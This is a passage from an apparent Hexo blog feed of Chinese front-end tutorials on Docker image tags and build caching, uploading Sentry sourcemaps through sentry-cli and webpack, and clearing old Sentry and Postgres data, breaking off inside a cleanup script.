data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612153220352-3636745e-4f35-486c-b597-be358c7b0ce2.png#height=664&id=Amb2v&originHeight=664&originWidth=1225&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115197&status=done&style=none&title=&width=1225" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>可以看到 tag 名多的眼花缭乱，第一次看大概率会懵逼，这里就大概解释下，其实所有的这些标签名都是对应基础镜像版本，如下：</p><p>linux 发行版： alpine， debian<br />debian 版本下 linux 代差：</p><ul><li>buster Debian10 （目前 node 默认）</li><li>stretch Debian9</li><li>jessie Debian8</li><li>wheezy Debian7</li></ul><p>slim 为修饰词，如 buster-slim，为 buster 版本下的删减版</p><p>这一下来看的话就比较清晰了，alpine 和 debian 对比来看的话，alpine 为 linux 的最小发行版本，貌似只有 5M，debian 是完整版本<br />当然这里还有个坑，docker 的官方镜像一般都是用 debian 作为镜像的，在网上查了下资料，除了包大小区别外，执行机制也有区别，具体没研究过，如<strong>果用在生产环境的话还是优先考虑 debian</strong>吧<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612154129532-cc5c3f56-df9b-447a-a322-6e26a54f1de6.png#height=88&id=WNglP&originHeight=88&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20558&status=done&style=none&title=&width=740" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612154129532-cc5c3f56-df9b-447a-a322-6e26a54f1de6.png#height=88&id=WNglP&originHeight=88&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20558&status=done&style=none&title=&width=740" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612154117039-3ba67c21-7ec8-485f-a622-443efb30470b.png#height=198&id=AEonF&originHeight=198&originWidth=763&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45016&status=done&style=none&title=&width=763" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612154117039-3ba67c21-7ec8-485f-a622-443efb30470b.png#height=198&id=AEonF&originHeight=198&originWidth=763&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45016&status=done&style=none&title=&width=763" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />关于 debian 版本代差的问题这个如果没有历史包袱的话默认 buster 就可以了，node 的 latest 就是用的这个版本，其实可以选择 slim 版本，从官网上给出的代码包大小来看相差了 6 倍，对于内存占用敏感的话可以使用<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612155108323-95c7b955-b383-4ae0-8f53-25972ee74d70.png#height=501&id=bToQ2&originHeight=501&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61313&status=done&style=none&title=&width=1243" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612155108323-95c7b955-b383-4ae0-8f53-25972ee74d70.png#height=501&id=bToQ2&originHeight=501&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61313&status=done&style=none&title=&width=1243" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>具体怎么自己做 slim <a href="#5kNcS">点击这里</a></p><p><a name="ATVC9"></a></p><h2 id="dockerfile-缓存机制"><a href="#dockerfile-缓存机制" class="headerlink" title="dockerfile 缓存机制"></a>dockerfile 缓存机制</h2><p>构建映像时，Docker 将逐步<code>Dockerfile</code>执行您的指令，  并按指定的顺序执行每个指令。在检查每条指令时，Docker 会在其缓存中查找可重用的现有映像，而不是创建新的（重复的）映像。<br />如果根本不想使用缓存，则可以使用命令<code>--no-cache=true</code> 上的选项<code>docker build</code>。但是，如果您确实让 Docker 使用其缓存，那么了解何时可以找到匹配的映像，这一点很重要。Docker 遵循的基本规则概述如下：</p><ul><li>从已在缓存中的父映像开始，将下一条指令与从该基本映像派生的所有子映像进行比较，以查看是否其中一个是使用完全相同的指令构建的。如果不是，则高速缓存无效。</li><li>在大多数情况下，只需将中的指令<code>Dockerfile</code>与子图像之一进行比较就足够了。但是，某些说明需要更多的检查和解释。</li><li>对于<code>ADD</code>和<code>COPY</code>指令，将检查图像中文件的内容，并为每个文件计算一个校验和。在这些校验和中不考虑文件的最后修改时间和最后访问时间。在缓存查找期间，将校验和与现有映像中的校验和进行比较。如果文件中的任何内容（例如内容和元数据）发生了更改，则缓存将无效。</li><li>除了<code>ADD</code>和<code>COPY</code>命令之外，缓存检查不会查看容器中的文件来确定缓存是否匹配。例如，在处理<code>RUN apt-get -y update</code>命令时，不检查容器中更新的文件以确定是否存在缓存命中。在这种情况下，仅使用命令字符串本身来查找匹配项。</li></ul><p>缓存无效后，所有后续<code>Dockerfile</code>命令都会生成新映像，并且不使用缓存</p><p>原文地址：<a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">https://docs.docker.com/develop/develop-images/dockerfile_best-practices&#x2F;</a></p><p><a name="jhWzS"></a></p><h2 id="关于更多命令"><a href="#关于更多命令" class="headerlink" title="关于更多命令"></a>关于更多命令</h2><p><a name="9wGlq"></a></p><h3 id="docker-cli-更多命令"><a href="#docker-cli-更多命令" class="headerlink" title="docker cli 更多命令"></a>docker cli 更多命令</h3><p>官方文档： <a href="https://docs.docker.com/engine/reference/run/">https://docs.docker.com/engine/reference/run/</a><br><a name="CTDUU"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p><a name="ZAOaR"></a></p><h3 id="docker-compose-cli-更多命令"><a href="#docker-compose-cli-更多命令" class="headerlink" title="docker-compose cli 更多命令"></a>docker-compose cli 更多命令</h3><p>官方文档：<a href="https://docs.docker.com/compose/reference/overview/">https://docs.docker.com/compose/reference/overview/</a></p><p><a name="jvVaM"></a></p><h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1><ul><li>docekr desktop: <a href="https://docs.docker.com/docker-for-mac/install/">https://docs.docker.com/docker-for-mac/install/</a></li><li>docker 新人文档： <a href="https://docs.docker.com/get-started/">https://docs.docker.com/get-started/</a></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sentry - sourceMap</title>
      <link href="/2023/06/28/frontend/monitor/sentry-sourcemap/"/>
      <url>/2023/06/28/frontend/monitor/sentry-sourcemap/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="gd2sm"></a></p><h2 id="一、-基于-sentry-cli-上传"><a href="#一、-基于-sentry-cli-上传" class="headerlink" title="一、 基于 sentry-cli 上传"></a>一、 基于 sentry-cli 上传</h2><p><a name="r0vl6"></a></p><h4 id="第一步：安装-sentry-cli"><a href="#第一步：安装-sentry-cli" class="headerlink" title="第一步：安装 sentry-cli"></a>第一步：安装 sentry-cli</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记得全局安装，这样方便点</span></span><br><span class="line">npm install @sentry/cli -g</span><br></pre></td></tr></table></figure><p><a name="ZZOOe"></a></p><h4 id="第二步：登陆-sentry-cli"><a href="#第二步：登陆-sentry-cli" class="headerlink" title="第二步：登陆 sentry-cli"></a>第二步：登陆 sentry-cli</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果你用的是官方版，不是自搭建的，可以直接 login</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接 login 其实就相当于：sentry-cli --url https://sentry.io/ login</span></span><br><span class="line">sentry-cli login</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果是公司或者自己自己搭建的sentry服务，则用这句话</span></span><br><span class="line">sentry-cli --url http://&#123;ip&#125;:9000/ login</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>--url</code> 表示是自己搭建的<strong>服务器网址</strong>，而不是官方登陆；</li><li>ip 改成自己的 ip 地址，端口同理；</li></ul><p><a name="UpZcz"></a></p><h4 id="第三步：输入-token询问是否需要帮你打开浏览器，开不开都行。接下来重点来了："><a href="#第三步：输入-token询问是否需要帮你打开浏览器，开不开都行。接下来重点来了：" class="headerlink" title="第三步：输入 token询问是否需要帮你打开浏览器，开不开都行。接下来重点来了："></a>第三步：输入 token<br />询问是否需要帮你打开浏览器，开不开都行。接下来重点来了：</h4><ul><li>找到我们第一步生成的 API key 令牌，粘贴进去；</li><li>还记得之前说要勾上读写权限吗？作用就在这里了。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/216305/1622195089025-58dfdd5a-6477-4f1f-a7a7-7e751f681532.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/216305/1622195089025-58dfdd5a-6477-4f1f-a7a7-7e751f681532.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="WX20210528-174422.png"></li></ul><p><a name="wFlPr"></a></p><h4 id="第四步：修改配置信息根据-token-最后提示的保存位置，找到-sentryclirc。在默认情况下，url-和-org-是没有的，需要自己补一下，就是服务器地址和组织名称。这里的配置很重要，这涉及到上传-sourceMap-文件的验证。"><a href="#第四步：修改配置信息根据-token-最后提示的保存位置，找到-sentryclirc。在默认情况下，url-和-org-是没有的，需要自己补一下，就是服务器地址和组织名称。这里的配置很重要，这涉及到上传-sourceMap-文件的验证。" class="headerlink" title="第四步：修改配置信息根据 token 最后提示的保存位置，找到 .sentryclirc。在默认情况下，url 和 org 是没有的，需要自己补一下，就是服务器地址和组织名称。这里的配置很重要，这涉及到上传 sourceMap 文件的验证。"></a>第四步：修改配置信息<br />根据 token 最后提示的保存位置，找到 <code>.sentryclirc</code>。在默认情况下，url 和 org 是没有的，需要自己补一下，就是服务器地址和组织名称。这里的配置很重要，这涉及到上传 sourceMap 文件的验证。</h4><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/216305/1622195707779-afd3f2e6-621b-4bc7-84ab-f0bc76b1569b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/216305/1622195707779-afd3f2e6-621b-4bc7-84ab-f0bc76b1569b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><strong>第五步：上传 sourceMap</strong><br />然后回到自己项目中，开始上传 sourceMap。命令如下：</p><blockquote><p>sentry-cli releases files v1.0.0 upload-sourcemaps ‘.&#x2F;dist&#x2F;js’ –url-prefix ‘~&#x2F;relx_demo&#x2F;js’</p></blockquote><p><br />参数说明：</p><ul><li><code>releases</code>：Sentry 通过 <code>releases</code> 来完成错误日志与 sourceMap 文件的匹配；</li><li><code>v1.0.0</code>: 代表 sourceMap 文件对应的版本；</li><li><code>./dist/js</code> ：这个是你本地项目 sourceMap 文件所在目录的文件；</li><li><code>--url-prefix</code> ：网页前缀。比如我们项目跑在 <code>http://xxx.com/relx_demo/#/</code>, 那我们的前缀就是<code>relx_demo</code>。我们需要访问<code>http://xxx.com/relx_demo/js</code> 才能找到对应的 JS 文件；</li></ul><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/216305/1622204135473-e877b217-2b34-4209-9841-437895a6c8c7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/216305/1622204135473-e877b217-2b34-4209-9841-437895a6c8c7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>正常上传成功的提示如下：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/216305/1622204206525-c07242db-c702-48d4-8174-841131319e8d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/216305/1622204206525-c07242db-c702-48d4-8174-841131319e8d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><strong>注：</strong><br />像我司跑的中后台项目模板，上传命令如下：</p><blockquote><p>sentry-cli releases files 2.1.8 upload-sourcemaps –url-prefix ‘~&#x2F;‘ ‘.&#x2F;dist&#x2F;‘ –log-level&#x3D;debug</p></blockquote><p><a name="NlcH7"></a></p><h2 id="二、-基于-webpack-上传"><a href="#二、-基于-webpack-上传" class="headerlink" title="二、 基于 webpack 上传"></a>二、 基于 webpack 上传</h2><p><a name="P8Lni"></a></p><h4 id="第一步：安装插件"><a href="#第一步：安装插件" class="headerlink" title="第一步：安装插件"></a>第一步：安装插件</h4><p>安装 webpack 插件 <code>@sentry/webpack-plugin</code><br /><code>yarn add @sentry/webpack-plugin -D</code></p><p>PS: 反复安装不上的时候.可能需要翻墙</p><p><a name="z60Ea"></a></p><h4 id="第二步：添加-sentryclirc"><a href="#第二步：添加-sentryclirc" class="headerlink" title="第二步：添加.sentryclirc"></a>第二步：添加<code>.sentryclirc</code></h4><p>添加<code>.sentryclirc</code> 文件到项目<strong>根目录</strong>下，注意文件名称要写对。sentry 会自动检测并使用<code>.sentryclirc</code> 文件中的配置信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">project=zfz-fp</span><br><span class="line">org=zhifuzi</span><br><span class="line">url=http://sentry.xxxxx.com/</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token=xxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>参数<code>url</code>：sentry 上报错误日志的网址；</li><li>参数<code>project</code>：项目名称；</li><li>参数<code>token</code>：找到我们第一步生成的 API key(一定要有<code>**project:write**</code>权限)，复制粘贴进去即可；</li><li>参数<code>org</code>：项目所属的组织(注意：不是团队，是<strong>所属组织</strong>)；<br><a name="d3p7b"></a></li></ul><h4 id="第三步：修改-umi-配置"><a href="#第三步：修改-umi-配置" class="headerlink" title="第三步：修改 umi 配置"></a>第三步：修改 umi 配置</h4><p>在 umi 中借用 webpack 的 <code>webpack-chain</code> 的 API 修改 webpack 配置。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">SentryWebpackPlugin</span> <span class="keyword">from</span> <span class="string">&#x27;@sentry/webpack-plugin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> defineConfig &#123;</span><br><span class="line">  <span class="attr">devtool</span>: <span class="string">&#x27;source-map&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 省略其他配置....</span></span><br><span class="line">  <span class="attr">chainWebpack</span>: <span class="keyword">function</span> (<span class="params">config, &#123; webpack &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">REACT_APP_ENV</span> === <span class="string">&#x27;prod&#x27;</span>) &#123;</span><br><span class="line">      config.<span class="title function_">plugin</span>(<span class="string">&#x27;sentry&#x27;</span>).<span class="title function_">use</span>(<span class="title class_">SentryWebpackPlugin</span>, [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// sentry-cli configuration</span></span><br><span class="line">          <span class="attr">configFile</span>: <span class="string">&#x27;./sentryclirc&#x27;</span>,</span><br><span class="line">          <span class="attr">release</span>: <span class="string">&#x27;2.1.2&#x27;</span>,</span><br><span class="line">          <span class="comment">// TODO 添加文件前缀,上传时自动拼接在上传文件的前面 eg: /static/js/test.js</span></span><br><span class="line">          <span class="comment">// default: &#x27;~/&#x27;</span></span><br><span class="line">          <span class="attr">urlPrefix</span>: <span class="string">&#x27;~/finance.phone&#x27;</span>,</span><br><span class="line">          <span class="comment">// webpack specific configuration</span></span><br><span class="line">          <span class="attr">include</span>: <span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">          <span class="attr">ignore</span>: [<span class="string">&#x27;node_modules&#x27;</span>, <span class="string">&#x27;config&#x27;</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">      ])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置说明：</p><ul><li>配置参数<code>configFile</code>：配置文件地址，这个一定要有；</li><li>配置参数<code>urlPrefix</code>：是线上 JS 的完整路径，必须<strong>设置正确</strong>，不然会看不到源码。<strong>重要！！！</strong></li><li>配置参数 <code>release</code>：版本号，要与项目的版本号做好一一对应；</li><li>配置参数 <code>include</code>：上传构建 bundle 文件的目录，此处是<code>./dist</code>目录；</li></ul><p><a name="Z6UIE"></a></p><h4 id="第四步：删除-sourcemap"><a href="#第四步：删除-sourcemap" class="headerlink" title="第四步：删除 sourcemap"></a>第四步：删除 sourcemap</h4><p>在完成 sourcemap 文件上传到 sentry 服务器后，还需将<strong>对应的 map 文件删除</strong>，避免根据 map 文件还原出相应源码。此处可以借助 npm 钩子来完成相应 map 文件的删除。<br />npm 提供了两种钩子，<code>pre</code>和<code>post</code>，分别代表操作前和操作后。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;prebuild&quot;</span><br><span class="line">&quot;build&quot;</span><br><span class="line">&quot;postbuild&quot;</span><br></pre></td></tr></table></figure><p>当执行<code>npm run build</code>脚本，会按序执行<code>npm run prebuild &amp;&amp; npm run build &amp;&amp; npm run postbuild</code>。</p><p>在 <code>package.json</code> 中添加删除 map 文件脚本：<code>&quot;postbuild:prod&quot;: &quot;rimraf ./dist/**/*.js.map&quot;</code>，每当项目运行构建命令<code>npm run build:prod</code>完成项目后会自动删除相应的 map 文件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scripts<span class="string">&quot;: &#123;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">  &quot;</span>postbuild<span class="punctuation">:</span>prod<span class="string">&quot;: &quot;</span>rimraf ./dist<span class="comment">/**/</span>*.js.map<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br></pre></td></tr></table></figure><p><a name="mlSgj"></a></p><h4 id="第五步：验证上传成功"><a href="#第五步：验证上传成功" class="headerlink" title="第五步：验证上传成功"></a>第五步：验证上传成功</h4><p>webpack 会有提示上传成功会有提示<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/192374/1632446658579-18eeb201-ac90-4a0e-be9e-82ee09d6038c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/192374/1632446658579-18eeb201-ac90-4a0e-be9e-82ee09d6038c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>或者 通过 【项目】 - 【设置（上传对应的项目中的设置）】 - 【source Maps】<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/192374/1632446796673-e344fdcc-ab34-453d-a4e5-61cc87ad817a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/192374/1632446796673-e344fdcc-ab34-453d-a4e5-61cc87ad817a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="MyEE7"></a></p><h2 id="三、-设置版本号"><a href="#三、-设置版本号" class="headerlink" title="三、 设置版本号"></a>三、 设置版本号</h2><p><a name="zWwyp"></a></p><h2 id="四、常见问题"><a href="#四、常见问题" class="headerlink" title="四、常见问题"></a>四、常见问题</h2><p><a name="mdr81"></a></p><h4 id="问题一：-工件-artifacts-为-0-的情况，可能是未上传成功"><a href="#问题一：-工件-artifacts-为-0-的情况，可能是未上传成功" class="headerlink" title="问题一： 工件(artifacts)为 0 的情况，可能是未上传成功"></a>问题一： 工件(artifacts)为 0 的情况，可能是未上传成功</h4><p>umi 中使用@sentry&#x2F;webpack-plugin 当出现错误时，不会进行报错（因为控制台被刷新掉了）<br />可以先使用 sentry-cli 方式上传尝试是否有报错。</p><p><a name="q8UcZ"></a></p><h4 id="问题二：souceMap-文件无法上传，系统报-413-错误。"><a href="#问题二：souceMap-文件无法上传，系统报-413-错误。" class="headerlink" title="问题二：souceMap 文件无法上传，系统报 413 错误。"></a>问题二：souceMap 文件无法上传，系统报 413 错误。</h4><p>造成这一问题的主要原因是 sourceMap 文件是通过 Nginx 服务转发到 sentry 服务器上的，Nginx 对文件上传有大小限制，针对这一问题，可以修改下 Nginx 配置即可，具体操作如下所示：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置项client_max_body_size 10M;</span></span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">....</span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">   ...</span><br><span class="line"><span class="attribute">client_max_body_size</span> <span class="number">10M</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="O7WgF"></a></p><h4 id="问题三：本地-dev-环境的触发-bug，在-sentry-上无法展开源码。"><a href="#问题三：本地-dev-环境的触发-bug，在-sentry-上无法展开源码。" class="headerlink" title="问题三：本地 dev 环境的触发 bug，在 sentry 上无法展开源码。"></a>问题三：本地 dev 环境的触发 bug，在 sentry 上无法展开源码。</h4><p>在使用本地 localhost 进行开发时，如果是 dev 环境，触发一个 bug 并上传到 sentry 中，是无法通过 sourceMap 进行源码定位的。因为本地 localhost 在 dev 环境下的生成缓存 bundle 文件和构建完生成的 bundle 文件基本是不一致(如 dev 环境下 webpack 的工作模式是<code>development</code>)，因为文件不一致所以 sourceMap 无法进行错误匹配。</p><p><a name="M3O6a"></a></p><h4 id="问题四：安装-sentry-x2F-cli-过慢？"><a href="#问题四：安装-sentry-x2F-cli-过慢？" class="headerlink" title="问题四：安装 @sentry&#x2F;cli 过慢？"></a>问题四：安装 @sentry&#x2F;cli 过慢？</h4><p>如果 @sentry&#x2F;cli 安装过慢，可以使用淘宝源，具体方法是在项目根目录新建 .npmrc 并增加以下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sentrycli_cdnurl=https://cdn.npm.taobao.org/dist/sentry-cli</span><br></pre></td></tr></table></figure><p><a name="v91la"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.yuque.com/sunyupeng/vscm7w/ke6q5c">https://www.yuque.com/sunyupeng/vscm7w/ke6q5c</a></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
            <tag> sentry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sentry - 清理数据</title>
      <link href="/2023/06/28/frontend/monitor/sentry-qing-li-shu-ju/"/>
      <url>/2023/06/28/frontend/monitor/sentry-qing-li-shu-ju/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="oXHsn"></a></p><h2 id="一、SENTRY-数据软清理-（清理完不会释放磁盘，如果很长时间没有运行，清理时间会很长）"><a href="#一、SENTRY-数据软清理-（清理完不会释放磁盘，如果很长时间没有运行，清理时间会很长）" class="headerlink" title="一、SENTRY 数据软清理 （清理完不会释放磁盘，如果很长时间没有运行，清理时间会很长）"></a>一、SENTRY 数据软清理 （清理完不会释放磁盘，如果很长时间没有运行，清理时间会很长）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登陆 sentry_worker_1 容器</span></span><br><span class="line">$ docker <span class="built_in">exec</span> -it sentry_onpremise_worker_1 bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留60天数据。cleanup的使用delete命令删除postgresql数据，但postgrdsql对于delete, update等操作，只是将对应行标志为DEAD，并没有真正释放磁盘空间</span></span><br><span class="line">$ sentry cleanup  --days 60</span><br></pre></td></tr></table></figure><p><a name="x64aQ"></a></p><h2 id="二、POSTGRES-数据清理-（清理完后会释放磁盘空间）"><a href="#二、POSTGRES-数据清理-（清理完后会释放磁盘空间）" class="headerlink" title="二、POSTGRES 数据清理 （清理完后会释放磁盘空间）"></a>二、POSTGRES 数据清理 （清理完后会释放磁盘空间）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登陆 sentry_onpremise_postgres_1 容器</span></span><br><span class="line">$ docker <span class="built_in">exec</span> -it sentry_onpremise_postgres_1 bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行清理</span></span><br><span class="line">$ vacuumdb -U postgres -d postgres -v -f --analyze</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="KKLFy"></a></p><h2 id="三、定时清理脚本"><a href="#三、定时清理脚本" class="headerlink" title="三、定时清理脚本"></a>三、定时清理脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 